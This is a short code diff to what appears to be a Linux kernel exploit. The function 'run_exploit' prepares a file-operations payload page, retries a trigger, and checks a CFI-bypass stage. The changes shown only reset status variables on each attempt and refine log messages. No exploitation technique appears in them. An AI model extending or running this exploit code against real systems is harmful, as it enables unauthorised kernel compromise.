@@ -698,6 +698,13 @@ int run_exploit(int argc, char **argv) {
   const int fops_single_attempts = 1;
 #endif
   for (int attempt = 1; attempt <= fops_single_attempts; attempt++) {
+    /* Per-iteration sentinel reset (same 0/0 convention as
+     * reset_main_route_state(), main.c:184-185): try_cfi_stage() only
+     * writes cfi_last_step/errno on paths it reaches, and a !triggered
+     * attempt never runs CFI at all, so without this the slide log below
+     * would print the previous attempt's stale step. */
+    cfi_last_step = 0;
+    cfi_last_errno = 0;
     if (attempt != 1) {
       page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
       if (!page_base) {
@@ -712,6 +719,13 @@ int run_exploit(int argc, char **argv) {
             attempt, triggered);
 #endif
     int verified = triggered && try_cfi_stage();
+    if (!triggered) {
+      /* CFI not run (trigger failed): try_cfi_stage() was short-circuited,
+       * so the 0/0 sentinel above stands — log it explicitly instead of
+       * letting the slide line below read as a CFI verdict. */
+      pr_info("app fops CFI not run (trigger failed) attempt=%d/%d\n",
+              attempt, fops_single_attempts);
+    }
     pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
             "step=%d errno=%d\n",
             attempt, fops_single_attempts, triggered, verified,
@@ -719,9 +733,15 @@ int run_exploit(int argc, char **argv) {
     if (verified || cfi_dirty_seen) {
       break;
     }
-    pr_info("app fops clean miss; retrying with fresh FOPS page "
-            "attempt=%d/%d\n",
-            attempt, fops_single_attempts);
+    if (attempt < fops_single_attempts) {
+      pr_info("app fops clean miss; retrying with fresh FOPS page "
+              "attempt=%d/%d\n",
+              attempt, fops_single_attempts);
+    } else {
+      pr_info("app fops final clean miss, no further retry "
+              "attempt=%d/%d\n",
+              attempt, fops_single_attempts);
+    }
   }
 #else
   for (int attempt = 1; attempt <= 1; attempt++) {
